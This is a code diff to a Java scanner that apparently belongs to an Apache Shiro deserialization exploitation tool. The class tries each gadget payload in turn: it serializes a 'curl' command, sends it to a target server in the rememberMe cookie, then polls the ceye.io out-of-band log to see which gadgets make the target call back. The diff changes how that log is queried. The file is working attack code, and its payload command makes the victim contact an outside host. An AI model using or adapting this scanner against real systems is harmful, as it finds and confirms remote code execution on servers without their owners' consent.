@@ -1,6 +1,7 @@
 package core.scan;
 
 import com.alibaba.fastjson.JSONObject;
+import core.conn.QueryConnection;
 import core.conn.ShiroHttpConnection;
 import core.payload.ObjectPayload;
 import core.payload.ScanKey;
@@ -32,7 +33,7 @@ public class GadgetScanner implements ShiroScanner {
     /**
      * 可用Gadget
      */
-    private static final Set<String> UsefulGadget = new HashSet<>();
+    private static final Set<String> AvailableGadget = new HashSet<>();
 
     private final ShiroTarget target;
 
@@ -42,18 +43,18 @@ public class GadgetScanner implements ShiroScanner {
 
     @Override
     public void scan() throws Exception {
-        String queryTemplate = "curl http://api.ceye.io/v1/records?token=%s&type=http&filter=%s";
+        String queryTemplate = "http://api.ceye.io/v1/records?token=%s&type=http&filter=%s";
         String commandTemplate = "curl %s/%s";
 
         Set<Class<? extends ObjectPayload>> set = Payload.getAllPayloadClass();
         set.remove(ScanKey.class);
         String key = target.getKey();
+        System.err.println("[+] Use Key: " + key);
         for (Class<? extends ObjectPayload> payloadClass : set) {
             ShiroHttpConnection connection = new ShiroHttpConnection(target.getBase());
             String id = RandomID.randomID();
             String command = String.format(commandTemplate, identifier, id);
             ObjectPayload obj = payloadClass.newInstance();
-            System.out.println("[+] Use Key: " + key);
             System.out.println("[+] Test Gadget: " + payloadClass.getSimpleName());
             Object payload = obj.getObjectPayload(command);
             byte[] serialize = Util.serialize(payload);
@@ -61,22 +62,18 @@ public class GadgetScanner implements ShiroScanner {
             connection.sendRememberMe(rememberMe, false);
 
             Thread.sleep(500);
-            // 客户端执行
-            String queryCommand = String.format(queryTemplate, token, id);
-            InputStream inputStream = Runtime.getRuntime().exec(queryCommand).getInputStream();
-            Scanner scanner = new Scanner(inputStream);
-            String queryResult = scanner.hasNextLine() ? scanner.nextLine() : "";
-            // parse json
-            JSONObject json = JSONObject.parseObject(queryResult);
-            if (json.get("data").toString().equals("[]")) {
+            String queryAddress = String.format(queryTemplate, token, id);
+            QueryConnection queryConnection = new QueryConnection(queryAddress);
+            String response = queryConnection.query();
+            if (response.equals("[]")) {
                 continue;
             }
-            UsefulGadget.add(payloadClass.getSimpleName());
+            AvailableGadget.add(payloadClass.getSimpleName());
             System.err.println("[*] Found Gadget: " + payloadClass.getSimpleName());
         }
 
         System.out.println("########Available Gadget##########");
-        UsefulGadget.forEach(System.out::println);
+        AvailableGadget.forEach(System.out::println);
         System.out.println("########Available Gadget##########");
     }
 }
